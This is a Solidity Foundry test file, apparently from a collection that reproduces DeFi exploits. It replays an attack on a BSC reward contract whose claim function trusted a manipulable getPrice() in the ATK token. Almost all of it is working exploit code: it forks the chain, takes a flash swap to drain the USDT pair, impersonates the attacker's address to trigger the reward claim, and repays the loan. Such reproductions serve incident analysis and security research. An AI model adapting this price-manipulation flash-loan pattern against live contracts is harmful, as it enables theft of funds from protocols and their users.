// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

// @Analysis
// https://twitter.com/BlockSecTeam/status/1580095325200474112
// @Contract address
// https://bscscan.com/tx/0x9e328f77809ea3c01833ec7ed8928edb4f5798c96f302b54fc640a22b3dd1a52 attack
// https://bscscan.com/tx/0x55983d8701e40353fee90803688170a16424ee702f6b21bb198bb8e7282112cd attack
// https://bscscan.com/tx/0x601b8ab0c1d51e71796a0df5453ca671ae23de3d5ec9ffd87b9c378504f99c32 profit

// closed-source Contract is design to deposit and claimReward , the calim Function use getPrice() in ASK Token Contract
// root cause: getPrice() function

contract ContractTest is DSTest {
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 ATK = IERC20(0x9cB928Bf50ED220aC8f703bce35BE5ce7F56C99c);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0xd228fAee4f73a73fcC73B6d9a1BD25EE1D6ee611);
    uint256 swapamount;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 22_102_838);
    }

    function testExploit() public {
        address(WBNB).call{value: 2 ether}("");
        WBNBToUSDT();
        swapamount = USDT.balanceOf(address(Pair)) - 3 * 1e18;
        Pair.swap(swapamount, 0, address(this), new bytes(1));
        emit log_named_decimal_uint(
            "[End] Attacker ATK balance after exploit",
            ATK.balanceOf(address(0xD7ba198ce82f4c46AD8F6148CCFDB41866750231)),
            18
        );
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        // call claimToken1 function
        cheats.startPrank(0xD7ba198ce82f4c46AD8F6148CCFDB41866750231);
        address(0x96bF2E6CC029363B57Ffa5984b943f825D333614).call(abi.encode(bytes4(0x8a809095)));
        cheats.stopPrank();
        USDT.transfer(address(Pair), swapamount * 10_000 / 9975 + 1000);
    }

    function WBNBToUSDT() internal {
        WBNB.approve(address(Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(USDT);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            WBNB.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }
}
